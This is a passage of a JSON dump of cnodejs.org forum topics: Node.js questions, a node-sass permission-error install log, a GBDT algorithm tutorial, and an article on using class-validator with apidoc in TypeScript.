src=\"//static.cnodejs.org/Fq7BDCdVOdnYWj1DMWZlD6yYslvh\" alt=\"`TCTF_L9_}G0O$}Z{$_P0UP.png\">![5Q6PAN@ZAQ]F_EPQ71MWDSI.png](<a href=\"//static.cnodejs.org/Ft3IU5AiJb5mzXqGlusw5mWyQLX4\">//static.cnodejs.org/Ft3IU5AiJb5mzXqGlusw5mWyQLX4</a>)</p>\n</div>","title":"cnode的accesstoken验证提示信息accesstoken错误","last_reply_at":"2019-01-04T01:46:37.670Z","good":false,"top":false,"reply_count":4,"visit_count":758,"create_at":"2019-01-01T11:26:40.127Z","author":{"loginname":"zxh2459917510","avatar_url":"https://avatars3.githubusercontent.com/u/46060624?v=4&s=120"}},{"id":"5c2de6b63898674067a7aca2","author_id":"5b2a60225cd02be6409015ed","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>function* generator(i) {\n  yield i;\n  yield i + 10;\n}\n</code></pre></div>","title":"求解生成器函数用箭头函数怎么写","last_reply_at":"2019-01-04T00:50:13.559Z","good":false,"top":false,"reply_count":2,"visit_count":583,"create_at":"2019-01-03T10:40:54.964Z","author":{"loginname":"vitozyf","avatar_url":"https://avatars0.githubusercontent.com/u/26626159?v=4&s=120"}},{"id":"5c2e058c3898674067a7adb2","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>GBDT 是常用的机器学习算法之一，因其出色的特征自动组合能力和高效的运算大受欢迎。 这里简单介绍一下 GBDT 算法的原理，后续再写一个实战篇。</p>\n<h2>1、决策树的分类</h2>\n<p>决策树分为两大类，分类树和回归树。</p>\n<p>分类树用于分类标签值，如晴天/阴天/雾/雨、用户性别、网页是否是垃圾页面；</p>\n<p>回归树用于预测实数值，如明天的温度、用户的年龄、网页的相关程度；</p>\n<p>两者的区别：</p>\n<ul>\n<li>分类树的结果不能进行加减运算，晴天 晴天没有实际意义；</li>\n<li>回归树的结果是预测一个数值，可以进行加减运算，例如 20 岁 3 岁=23 岁。</li>\n<li>GBDT 中的决策树是回归树，预测结果是一个数值，在点击率预测方面常用 GBDT，例如用户点击某个内容的概率。</li>\n</ul>\n<h2>2、GBDT 概念</h2>\n<p>GBDT 的全称是 Gradient Boosting Decision Tree，梯度提升决策树。</p>\n<p>要理解 GBDT，首先就要理解这个 B(Boosting)。</p>\n<p>Boosting 是一族可将弱学习器提升为强学习器的算法，属于集成学习（ensemble learning）的范畴。Boosting 方法基于这样一种思想：对于一个复杂任务来说，将多个专家的判断进行适当的综合所得出的判断，要比其中任何一个专家单独的判断要好。通俗地说，就是&quot;三个臭皮匠顶个诸葛亮&quot;的道理。</p>\n<p>基于梯度提升算法的学习器叫做 GBM(Gradient Boosting Machine)。理论上，GBM 可以选择各种不同的学习算法作为基学习器。GBDT 实际上是 GBM 的一种情况。</p>\n<p>为什么梯度提升方法倾向于选择决策树作为基学习器呢？(也就是 GB 为什么要和 DT 结合，形成 GBDT) 决策树可以认为是 if-then 规则的集合，易于理解，可解释性强，预测速度快。同时，决策树算法相比于其他的算法需要更少的特征工程，比如可以不用做特征标准化，可以很好的处理字段缺失的数据，也可以不用关心特征间是否相互依赖等。决策树能够自动组合多个特征。</p>\n<p>不过，单独使用决策树算法时，有容易过拟合缺点。所幸的是，通过各种方法，抑制决策树的复杂性，降低单颗决策树的拟合能力，再通过梯度提升的方法集成多个决策树，最终能够很好的解决过拟合的问题。由此可见，梯度提升方法和决策树学习算法可以互相取长补短，是一对完美的搭档。</p>\n<p>至于抑制单颗决策树的复杂度的方法有很多，比如限制树的最大深度、限制叶子节点的最少样本数量、限制节点分裂时的最少样本数量、吸收 bagging 的思想对训练样本采样（subsample），在学习单颗决策树时只使用一部分训练样本、借鉴随机森林的思路在学习单颗决策树时只采样一部分特征、在目标函数中添加正则项惩罚复杂的树结构等。</p>\n<p><strong>演示例子：</strong></p>\n<p>考虑一个简单的例子来演示 GBDT 算法原理。</p>\n<p>下面是一个二分类问题，1 表示可以考虑的相亲对象，0 表示不考虑的相亲对象。</p>\n<p>特征维度有 3 个维度，分别对象 身高，金钱，颜值</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501642956355_9623_1501642956595.jpg\" alt=\"img\"></p>\n<p>对应这个例子，训练结果是 perfect 的，全部正确， 特征权重可以看出，对应这个例子训练结果颜值的重要度最大，看一下训练得到的树。</p>\n<p><strong>Tree 0：</strong></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501642975765_6260_1501642976002.jpg\" alt=\"img\"></p>\n<p><strong>Tree 1：</strong></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501642989663_421_1501642989882.jpg\" alt=\"img\"></p>\n<h2>3、原理推导</h2>\n<h3>3.1 目标函数</h3>\n<p>监督学习的关键概念：模型（model）、参数（parameters）、目标函数（objective function）</p>\n<p>模型就是所要学习的条件概率分布或者决策函数，它决定了在给定特征向量时如何预测出目标。</p>\n<p>参数就是我们要从数据中学习得到的内容。模型通常是由一个参数向量决定的函数。</p>\n<p>目标函数通常定义为如下形式：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643033959_4316_1501643034178.jpg\" alt=\"img\"></p>\n<p>其中，L 是损失函数，用来衡量模型拟合训练数据的好坏程度；Ω称之为正则项，用来衡量学习到的模型的复杂度。</p>\n<p>对正则项的优化鼓励算法学习到较简单的模型，简单模型一般在测试样本上的预测结果比较稳定、方差较小（奥坎姆剃刀原则）。也就是说，优化损失函数尽量使模型走出欠拟合的状态，优化正则项尽量使模型避免过拟合。</p>\n<h3>3.2 加法模型</h3>\n<p>GBDT 算法可以看成是由 K 棵树组成的加法模型：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643159062_4093_1501643159278.jpg\" alt=\"img\"></p>\n<p>如何来学习加法模型呢？</p>\n<p>解这一优化问题，可以用前向分布算法（forward stagewise algorithm）。因为学习的是加法模型，如果能够从前往后，每一步只学习一个基函数及其系数（结构），逐步逼近优化目标函数，那么就可以简化复杂度。这一学习过程称之为 Boosting。具体地，我们从一个常量预测开始，每次学习一个新的函数，过程如下：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643175179_8337_1501643175388.jpg\" alt=\"img\"></p>\n<p>在第 t 步，这个时候目标函数可以写为：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643190325_9227_1501643190542.jpg\" alt=\"img\"></p>\n<p>举例说明，假设损失函数为平方损失（square loss），则目标函数为：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643530792_8221_1501643531003.jpg\" alt=\"img\"></p>\n<p>其中，称</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643566431_532_1501643566607.jpg\" alt=\"img\"></p>\n<p>之为残差（residual）。因此，使用平方损失函数时，GBDT 算法的每一步在生成决策树时只需要拟合前面的模型的残差。</p>\n<h3>3.3 泰勒公式</h3>\n<p>定义：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643596877_7984_1501643597159.jpg\" alt=\"img\"></p>\n<p>泰勒公式简单的理解，就是函数某个点的取值可以用参考点取值和 n+1 阶导数的来表示，而且这个公式是有规律的比较好记。</p>\n<p>根据泰勒公式把函数</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643642254_3181_1501643642431.jpg\" alt=\"img\"></p>\n<p>在</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643652104_1930_1501643652272.jpg\" alt=\"img\"></p>\n<p>点处二阶展开，可得到如下等式：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643677719_7983_1501643678144.jpg\" alt=\"img\"></p>\n<p>则等式(1) 可转化为：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643695330_7395_1501643695522.jpg\" alt=\"img\"></p>\n<p>假设损失函数为平方损失函数，把对应的一阶导数和二阶导数代入等式(4) 即得等式(2)。</p>\n<p>由于函数中的常量在函数最小化的过程中不起作用，因此我们可以从等式(4) 中移除掉常量项，得：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643721348_276_1501643721529.jpg\" alt=\"img\"></p>\n<h3>3.4 GBDT 算法</h3>\n<p>一颗生成好的决策树，假设其叶子节点个数为</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643743043_672_1501643743205.jpg\" alt=\"img\"></p>\n<p>，</p>\n<p>决策树的复杂度可以由正则项</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643770059_803_1501643770241.jpg\" alt=\"img\"></p>\n<p>来定义，即决策树模型的复杂度由生成的树的叶子节点数量和叶子节点对应的值向量的 L2 范数决定。</p>\n<p>定义集合</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643782351_8623_1501643782510.jpg\" alt=\"img\"></p>\n<p>为所有被划分到叶子节点的训练样本的集合。等式(5) 可以根据树的叶子节点重新组织为 T 个独立的二次函数的和：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643829832_7433_1501643830044.jpg\" alt=\"img\"></p>\n<p>定义</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643841474_1618_1501643841649.jpg\" alt=\"img\"></p>\n<p>，则等式(6) 可写为：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643855958_6279_1501643856128.jpg\" alt=\"img\"></p>\n<p>因为一元二次函数最小值处，一阶导数等于 0:</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643878529_9216_1501643878701.jpg\" alt=\"img\"></p>\n<p>此时，目标函数的值为</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643889509_6268_1501643889675.jpg\" alt=\"img\"></p>\n<p>综上，为了便于理解，单颗决策树的学习过程可以大致描述为： 1. 枚举所有可能的树结构 q 2. 用等式(8) 为每个 q 计算其对应的分数 Obj，分数越小说明对应的树结构越好 3. 根据上一步的结果，找到最佳的树结构，用等式(7) 为树的每个叶子节点计算预测值</p>\n<p>然而，可能的树结构数量是无穷的，所以实际上我们不可能枚举所有可能的树结构。通常情况下，我们采用贪心策略来生成决策树的每个节点。</p>\n<p>\\1. 从深度为 0 的树开始，对每个叶节点枚举所有的可用特征 2. 针对每个特征，把属于该节点的训练样本根据该特征值升序排列，通过线性扫描的方式来决定该特征的最佳分裂点，并记录该特征的最大收益（采用最佳分裂点时的收益） 3. 选择收益最大的特征作为分裂特征，用该特征的最佳分裂点作为分裂位置，把该节点生长出左右两个新的叶节点，并为每个新节点关联对应的样本集 4. 回到第 1 步，递归执行到满足特定条件为止</p>\n<h3>3.5 收益的计算</h3>\n<p>如何计算每次分裂的收益呢？假设当前节点记为 C,分裂之后左孩子节点记为 L，右孩子节点记为 R，则该分裂获得的收益定义为当前节点的目标函数值减去左右两个孩子节点的目标函数值之和：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643944893_232_1501643945037.jpg\" alt=\"img\"></p>\n<p>根据等式(8) 可得：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643975754_9322_1501643975923.jpg\" alt=\"img\"></p>\n<p>其中，</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501643985291_6528_1501643985636.jpg\" alt=\"img\"></p>\n<p>项表示因为增加了树的复杂性（该分裂增加了一个叶子节点）带来的惩罚。</p>\n<p>最后，总结一下 GBDT 的学习算法：</p>\n<ol>\n<li>算法每次迭代生成一颗新的决策树 ;</li>\n<li>在每次迭代开始之前，计算损失函数在每个训练样本点的一阶导数和二阶导数 ;</li>\n<li>通过贪心策略生成新的决策树，通过等式(7) 计算每个叶节点对应的预测值</li>\n<li>把新生成的决策树</li>\n</ol>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501644059271_1472_1501644059430.jpg\" alt=\"img\"></p>\n<p>添加到模型中：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1501644064883_2052_1501644065000.jpg\" alt=\"img\"></p>\n<p><strong>保持简单</strong></p>\n<p>易经中说道&quot;易则易知，简则易从&quot;，就是越是简易的东西，越是容易被理解和得到执行。很多机器学习模型都会尽量让学习到的模型尽量简单，尽量减少参数，越是简单的模型，通用性越好，也是这个道理。</p>\n<p><strong>Xgboost 和 GBDT 的区别：</strong></p>\n<p>GBDT：</p>\n<ul>\n<li>GBDT 它的非线性变换比较多，表达能力强，而且不需要做复杂的特征工程和特征变换。</li>\n<li>GBDT 的缺点也很明显，Boost 是一个串行过程，不好并行化，而且计算复杂度高，同时不太适合高维稀疏特征；</li>\n<li>传统 GBDT 在优化时只用到一阶导数信息。</li>\n</ul>\n<p>Xgboost：</p>\n<p>它有以下几个优良的特性：</p>\n<ol>\n<li>显示的把树模型复杂度作为正则项加到优化目标中。</li>\n<li>公式推导中用到了二阶导数，用了二阶泰勒展开。（GBDT 用牛顿法貌似也是二阶信息）</li>\n<li>实现了分裂点寻找近似算法。</li>\n<li>利用了特征的稀疏性。</li>\n<li>数据事先排序并且以 block 形式存储，有利于并行计算。</li>\n<li>基于分布式通信框架 rabit，可以运行在 MPI 和 yarn 上。（最新已经不基于 rabit 了）</li>\n<li>实现做了面向体系结构的优化，针对 cache 和内存做了性能优化。</li>\n</ol>\n<p><strong>此文已由作者授权腾讯云+社区在各渠道发布</strong></p>\n<p><strong>获取更多新鲜技术干货，可以关注我们腾讯云技术社区-云加社区官方号及知乎机构号</strong></p>\n</div>","title":"GBDT 算法：原理篇","last_reply_at":"2019-01-03T22:41:20.747Z","good":false,"top":false,"reply_count":1,"visit_count":577,"create_at":"2019-01-03T12:52:28.307Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5bbf255737a6965f590520d2","author_id":"5bbc0a2f15e4fd1923f48d58","tab":"ask","content":"<div class=\"markdown-text\"><p>想写一个个人网站，记录一下自己生活的趣事，值得记忆的事，以及一些个人文章，有什么推荐的技术，框架吗？</p>\n</div>","title":"想写一个个人网站 量级不大 大伙有什么推荐的框架吗？","last_reply_at":"2019-01-03T17:12:30.816Z","good":false,"top":false,"reply_count":14,"visit_count":2063,"create_at":"2018-10-11T10:26:31.173Z","author":{"loginname":"liyechen","avatar_url":"https://avatars0.githubusercontent.com/u/13324537?v=4&s=120"}},{"id":"5c2a0ad376c4964062a1f60f","author_id":"5c2a094076c4964062a1f606","tab":"share","content":"<div class=\"markdown-text\"><h2>引子</h2>\n<p>对每个接口的传入参数进行校验，是一个Web后端项目的必备功能，有一个npm包叫<a href=\"https://github.com/hapijs/joi\">Joi</a>可以很优雅的完成这个工作，比如这样子：</p>\n<pre class=\"prettyprint\"><code>const schema = {\n    \buserId: Joi.string()\n};\nconst {error, value} = Joi.validate({ userId: &#x27;a string&#x27; }, schema);\n</code></pre><p>我们使用Typescript是希望得到明确的类型定义，减少出错的可能性。在一个后端项目中，给每个接口定义它的传入参数结构以及返回结果的结构，是一件\b很值得做的事情，因为\b这样\b给后续的维护带来极大的便利。比如这样子：</p>\n<pre class=\"prettyprint\"><code>export type IFooParam = {\n  userId: string\n}\n\nexport type IFooResponse = {\n  name: string\n}\n\nasync foo (param: IFooParam): Promise&lt;IFooResponse&gt; {\n  &#x2F;&#x2F; Your business code\n  return {name: &#x27;bar&#x27;}\n}\n</code></pre><p>现在问题就来了，如果传入参数希望加多一个字段，我们必须得修改2个地方，一个是Joi的校验，一个是IFooParam类型的定义。有没有好的办法解决这个问题呢？</p>\n<h2>Class-validaotr</h2>\n<p>有一个npm包叫<a href=\"https://github.com/typestack/class-validator\">class-validator</a>, 是采用注解的方式进行校验，底层使用的是老牌的校验包<a href=\"https://github.com/chriso/validator.js\">validator.js</a>。其实一年前我就想试用这个class-validator包，但是没有成功，这次再试用一次，发现通过一些小包装，居然做到像Joi一样优雅的写法，而且更好用！</p>\n<h3>定义传入/返回结构</h3>\n<pre class=\"prettyprint\"><code>import {Length, Min, Max} from &#x27;class-validator&#x27;\n\nexport class IRegister {\n  @Length(11)\n  phone: string\n\n  @Length(2, 10)\n  name: string\n\n  @Min(18)\n  @Max(50)\n  age: number\n}\n\nclass Button {\n  text: string\n}\n\nexport class ORegister {\n  &#x2F;**\n   * user&#x27;s id\n   *&#x2F;\n  userId: string\n\n  buttons: Button[]\n}\n</code></pre><p>这里定义了2个类，IRegister为传入参数，通过class-validator规定的注解方式做校验，ORegister为返回结果。</p>\n<p>class-validator官方提供的方式还不能直接对一个请求的body进行校验，它要求必须要是IRegister类的一个对象，所以需要做一些处理。</p>\n<h3>使用class-transformer做转化</h3>\n<p>跟class-validator的作者也开源了另外一个包，叫<a href=\"https://github.com/typestack/class-transformer\">class-transformer</a>, 可以将一个json转成指定的类的对象，官方的例子是这样的：</p>\n<pre class=\"prettyprint\"><code>import {plainToClass} from &quot;class-transformer&quot;;\n\nlet users = plainToClass(User, userJson); &#x2F;&#x2F; to convert user plain object a single user. also supports arrays\n</code></pre><p>利用这一点，我们写一个小工具：</p>\n<pre class=\"prettyprint\"><code>import * as classTransformer from &#x27;class-transformer&#x27;\nimport {validate} from &#x27;class-validator&#x27;\nimport * as lodash from &#x27;lodash&#x27;\n\nexport class ValidateUtil {\n  private static instance: ValidateUtil\n\n  private constructor () {\n  }\n\n  static getInstance () {\n    return this.instance || (this.instance = new ValidateUtil())\n  }\n\n  async validate (Clazz, data): Promise&lt;any&gt; {\n    const obj = classTransformer.plainToClass(Clazz, data)\n    const errors = await validate(obj)\n    if (errors.length &gt; 0) {\n      console.info(errors)\n      throw new Error(lodash.values(errors[0].constraints)[0])\n    }\n    return obj\n  }\n}\n</code></pre><p>这个小工具提供了一个validate方法，第一个参数是一个类定义，第二个是一个json\b，它先利用class-transformer将json转成指定类的对象，然后使用class-validator做校验，如果校验错误将\b抛出错误，否则返回转化后的对象。</p>\n<h3>在\b\bController中使用</h3>\n<p>有了上面的工具，就可以方便地在代码中对传入参数做校验了，比如这样：</p>\n<pre class=\"prettyprint\"><code>  static async register(ctx) {\n    const iRegister = await ValidateUtil.getInstance().validate(IRegister, ctx.request.body)\n    const oRegister = await UserService.register(iRegister)\n    ctx.body = oRegister\n  }\n</code></pre><h2>新问题</h2>\n<p>到了这里，完美地使用class-validator替换掉了Joi。</p>\n<p>但是还有一个问题没解决，也是之前一直遗留的问题。</p>\n<p>我们使用<a href=\"http://apidocjs.com/\">apidoc</a>编写接口文档，当新增或修改一个接口时，是\b通过编写一段注释，让apidoc自动生成html文档，将文档地址发给前端，可以减少双方的频繁沟通，而且对前端的体验也是非常好的。比如写这样一段注释：</p>\n<pre class=\"prettyprint\"><code>  &#x2F;**\n   * @api {post} &#x2F;user&#x2F;registerOld registerOld\n   * @apiGroup user\n   * @apiName registerOld\n   * @apiParam {String} name user&#x27;s name\n   * @apiParam {Number} age user&#x27;s age\n   * @apiSuccess {String} userId user&#x27;s id \n   *&#x2F;\n  router.post(&#x27;&#x2F;user&#x2F;registerOld&#x27;, UserController.register)\n</code></pre><p>apidoc会帮我们生成这样的文档：\n<img src=\"https://zhengyhn.github.io/images/oldApidocDemo.png\" alt=\"oldApidocDemo\"></p>\n<p>问题比较明显，当我们要\b新增一个参数时，\b需要修改一次类的定义，同时还要修改一次apidoc的注释，很烦，由于很烦，文档会慢慢变得没人维护，新同事就会吐槽没有文档或者文档太旧了。</p>\n<p>理想的情况是代码即文档，只需要修改类的定义，apidoc文档自动更新。</p>\n<h2>探索apidoc根据class-validator的定义生成</h2>\n<p>从同事的分享中得知一个废弃的npm包，叫<a href=\"https://www.npmjs.com/package/apidoc-plugin-ts\">apidoc-plugin-ts</a>, 可以实现根据ts的interface定义来生成apidoc的。官方的例子：</p>\n<pre class=\"prettyprint\"><code>filename: .&#x2F;employers.ts\n \nexport interface Employer {\n  &#x2F;**\n   * Employer job title\n   *&#x2F;\n  jobTitle: string;\n  &#x2F;**\n   * Employer personal details\n   *&#x2F;\n  personalDetails: {\n    name: string;\n    age: number;\n  }\n}\n</code></pre><pre class=\"prettyprint\"><code> @apiInterface (.&#x2F;employers.ts) {Person}\n</code></pre><p>会转化成：</p>\n<pre class=\"prettyprint\"><code> @apiSuccess {String} jobTitle Job title\n @apiSuccess {Object} personalDetails Empoyer personal details\n @apiSuccess {String} personalDetails.name\n @apiSuccess {Number} personalDetails.age\n</code></pre><p>虽然不知道为什么作者要废弃它，但是它的思想很好，源码也很有帮助。</p>\n<p>给我的启发是，参考这个npm包，写一个针对class定义来生成apidoc的插件就行了。</p>\n<h2>造轮子: apidoc-plugin-class-validator</h2>\n<p>轮子的制造细节不适合在这里陈述，基本上参考apidoc-plugin-ts，目前已经发布在npm上了，<a href=\"https://www.npmjs.com/package/apidoc-plugin-class-validator\">apidoc-plugin-class-validator</a></p>\n<h2>使用apidoc-plugin-class-validator</h2>\n<p>以上面的注册接口为例，使用\b方法：</p>\n<pre class=\"prettyprint\"><code>  &#x2F;**\n   * @api {post} &#x2F;user&#x2F;register register\n   * @apiGroup user\n   * @apiName register\n   * @apiParamClass (src&#x2F;user&#x2F;io&#x2F;Register.ts) {IRegister}\n   * @apiSuccessClass (src&#x2F;user&#x2F;io&#x2F;Register.ts) {ORegister}\n   *&#x2F;\n  router.post(&#x27;&#x2F;user&#x2F;register&#x27;, UserController.register)\n</code></pre><p>就会生成文档：\n<img src=\"https://github.com/zhengyhn/apidoc-plugin-class-validator/blob/master/demo.png?raw=true\" alt=\"demo\"></p>\n<p>后续新增字段，只需修改IRegister类的定义就行，真正做到了修改一处，处处生效，代码即文档的效果。</p>\n<p>本文的demo代码在<a href=\"https://github.com/zhengyhn/apidoc-plugin-class-validator-demo\">这里</a>，这是一个简单的web后端项目，看代码更容易理解。</p>\n<p>本文首发于<a href=\"https://zhengyhn.github.io/post/typescript/replace-joi-with-class-validator-in-typescript/\">我的博客</a>，预祝大家元旦快乐！</p>\n</div>","title":"在Typescript中用class-validator代替Joi的探索之路","last_reply_at":"2019-01-03T15:31:24.882Z","good":false,"top":false,"reply_count":8,"visit_count":1086,"create_at":"2018-12-31T12:25:55.170Z","author":{"loginname":"zhengyhn","avatar_url":"https://avatars3.githubusercontent.com/u/19358856?v=4&s=120"}},{"id":"5c2e17665bf06c5e7e3f0ec9","author_id":"583ea7c227d001d606ac1ae6","tab":"ask","content":"<div class=\"markdown-text\"><p>npm WARN deprecated browserslist@1.7.7: Browserslist 2 could fail on reading Browserslist &gt;3.0 config used in other tools.</p>\n<blockquote>\n<p>node-sass@4.11.0 install /developer/git-repo/shop-backend/node_modules/node-sass\nnode scripts/install.js</p>\n</blockquote>\n<p>Unable to save binary /developer/git-repo/shop-backend/node_modules/node-sass/vendor/linux-x64-64 : { Error: EACCES: permission denied, mkdir ‘/developer/git-repo/shop-backend/node_modules/node-sass/vendor’\nat Object.mkdirSync (fs.js:753:3)\nat sync (/developer/git-repo/shop-backend/node_modules/mkdirp/index.js:71:13)\nat Function.sync (/developer/git-repo/shop-backend/node_modules/mkdirp/index.js:77:24)\nat checkAndDownloadBinary (/developer/git-repo/shop-backend/node_modules/node-sass/scripts/install.js:114:11)\nat Object.&lt;anonymous&gt; (/developer/git-repo/shop-backend/node_modules/node-sass/scripts/install.js:157:1)\nat Module._compile (internal/modules/cjs/loader.js:689:30)\nat Object.Module._extensions…js (internal/modules/cjs/loader.js:700:10)\nat Module.load (internal/modules/cjs/loader.js:599:32)\nat tryModuleLoad (internal/modules/cjs/loader.js:538:12)\nat Function.Module._load (internal/modules/cjs/loader.js:530:3)\nerrno: -13,\nsyscall: ‘mkdir’,\ncode: ‘EACCES’,\npath:\n’/developer/git-repo/shop-backend/node_modules/node-sass/vendor’ }</p>\n<blockquote>\n<p>uglifyjs-webpack-plugin@0.4.6 postinstall /developer/git-repo/shop-backend/node_modules/uglifyjs-webpack-plugin\nnode lib/post_install.js</p>\n</blockquote>\n<blockquote>\n<p>node-sass@4.11.0 postinstall /developer/git-repo/shop-backend/node_modules/node-sass\nnode scripts/build.js</p>\n</blockquote>\n<p>Building: /usr/local/node-v10.15.0-linux-x64/bin/node /developer/git-repo/shop-backend/node_modules/node-gyp/bin/node-gyp.js rebuild --verbose --libsass_ext= --libsass_cflags= --libsass_ldflags= --libsass_library=\ngyp info it worked if it ends with ok\ngyp verb cli [ ‘/usr/local/node-v10.15.0-linux-x64/bin/node’,\ngyp verb cli   ‘/developer/git-repo/shop-backend/node_modules/node-gyp/bin/node-gyp.js’,\ngyp verb cli   ‘rebuild’,\ngyp verb cli   ‘–verbose’,\ngyp verb cli   ‘–libsass_ext=’,\ngyp verb cli   ‘–libsass_cflags=’,\ngyp verb cli   ‘–libsass_ldflags=’,\ngyp verb cli   ‘–libsass_library=’ ]\ngyp info using node-gyp@3.8.0\ngyp info using node@10.15.0 | linux | x64\ngyp verb command rebuild []\ngyp verb command clean []\ngyp verb clean removing “build” directory\ngyp verb command configure []\ngyp verb check python checking for Python executable “python2” in the PATH\ngyp verb <code>which</code> succeeded python2 /usr/bin/python2\ngyp verb check python version <code>/usr/bin/python2 -c &quot;import sys; print &quot;2.7.5 gyp verb check python version .%s.%s&quot; % sys.version_info[:3];&quot;</code> returned: %j\ngyp verb get node dir no --target version specified, falling back to host node version: 10.15.0\ngyp verb command install [ ‘10.15.0’ ]\ngyp verb install input version string &quot;10.15.0&quot;\ngyp verb install installing version: 10.15.0\ngyp verb install --ensure was passed, so won’t reinstall if already installed\ngyp verb install version not already installed, continuing with install 10.15.0\ngyp verb ensuring nodedir is created /root/.node-gyp/10.15.0\ngyp WARN EACCES user “root” does not have permission to access the dev dir &quot;/root/.node-gyp/10.15.0&quot;\ngyp WARN EACCES attempting to reinstall using temporary dev dir &quot;/developer/git-repo/shop-backend/node_modules/node-sass/.node-gyp&quot;\ngyp verb tmpdir == cwd automatically will remove dev files after to save disk space\ngyp verb command install [ ‘–node_gyp_internal_noretry’, ‘10.15.0’ ]\ngyp verb install input version string &quot;10.15.0&quot;\ngyp verb install installing version: 10.15.0\ngyp verb install --ensure was passed, so won’t reinstall if already installed\ngyp verb install version not already installed, continuing with install 10.15.0\ngyp verb ensuring nodedir is created /developer/git-repo/shop-backend/node_modules/node-sass/.node-gyp/10.15.0\ngyp WARN install got an error, rolling back install\ngyp verb command remove [ ‘10.15.0’ ]\ngyp verb remove using node-gyp dir: /developer/git-repo/shop-backend/node_modules/node-sass/.node-gyp\ngyp verb remove removing target version: 10.15.0\ngyp verb remove removing development files for version: 10.15.0\ngyp WARN install got an error, rolling back install\ngyp verb command remove [ ‘10.15.0’ ]\ngyp verb remove using node-gyp dir: /developer/git-repo/shop-backend/node_modules/node-sass/.node-gyp\ngyp verb remove removing target version: 10.15.0\ngyp verb remove removing development files for version: 10.15.0\ngyp ERR! configure error\ngyp ERR! stack Error: EACCES: permission denied, mkdir '/developer/git-repo/shop-backend/node_modules/node-sass/.node-gyp’\ngyp ERR! System Linux 3.10.0-693.2.2.el7.x86_64\ngyp ERR! command “/usr/local/node-v10.15.0-linux-x64/bin/node” “/developer/git-repo/shop-backend/node_modules/node-gyp/bin/node-gyp.js” “rebuild” “–verbose” “–libsass_ext=” “–libsass_cflags=” “–libsass_ldflags=” &quot;–libsass_library=&quot;\ngyp ERR! cwd /developer/git-repo/shop-backend/node_modules/node-sass\ngyp ERR! node -v v10.15.0\ngyp ERR! node-gyp -v v3.8.0\ngyp ERR! not ok\nBuild failed with error code: 1\nnpm WARN ajv-keywords@3.2.0 requires a peer of ajv@^6.0.0 but none is installed. You must install peer dependencies yourself.\nnpm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.4 (node_modules/fsevents):\nnpm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted {“os”:“darwin”,“arch”:“any”} (current: {“os”:“linux”,“arch”:“x64”})</p>\n<p>npm ERR! code ELIFECYCLE\nnpm ERR! errno 1\nnpm ERR! node-sass@4.11.0 postinstall: <code>node scripts/build.js</code>\nnpm ERR! Exit status 1\nnpm ERR!\nnpm ERR! Failed at the node-sass@4.11.0 postinstall script.\nnpm ERR! This is probably not a problem with npm. There is likely additional logging output above.</p>\n<p>npm ERR! A complete log of this run can be found in:\nnpm ERR!     /root/.npm/_logs/2019-01-03T03_54_00_385Z-debug.log</p>\n</div>","title":"centos下npm install的时候node-sass报错,这该如何解决?","last_reply_at":"2019-01-03T15:01:47.021Z","good":false,"top":false,"reply_count":1,"visit_count":670,"create_at":"2019-01-03T14:08:38.873Z","author":{"loginname":"labike","avatar_url":"https://avatars3.githubusercontent.com/u/15871933?v=4&s=120"}},{"id":"5c2d7fc276c4964062a200fd","author_id":"5a28aebd9807389a1809f1d5","tab":"ask","content":"<div class=\"markdown-text\"><p>pm2 --help 等与查看进程信息无关的命令有反应。。\n请教下有人遇到过该问题吗？？<img src=\"//static.cnodejs.org/Fv-2fWvGXuC0e4CKD39hDgSPgBiv\" alt=\"QQ截图20190103111832.png\"><img src=\"//static.cnodejs.org/FrgiaT5Nn-3zs31pVGR9lL4EJFOw\" alt=\"QQ截图20190103111905.png\"></p>\n</div>","title":"pm2 list, info, stop, show 查看与进程有关的命令输入后无反应，pm2 卡住","last_reply_at":"2019-01-03T13:54:07.023Z","good":false,"top":false,"reply_count":3,"visit_count":505,"create_at":"2019-01-03T03:21:38.371Z","author":{"loginname":"Studying-Man","avatar_url":"https://avatars1.githubusercontent.com/u/19872507?v=4&s=120"}},{"id":"5c2df1b23898674067a7acf8","author_id":"564582ec5e7412b625b8bf16","tab":"share","content":"<div class=\"markdown-text\"><p>技术要求:node，vue，vuex，typescript。\nweixin:c35353\n信息太多，加我请备注 cnode。</p>\n<p>来自酷炫的 <a 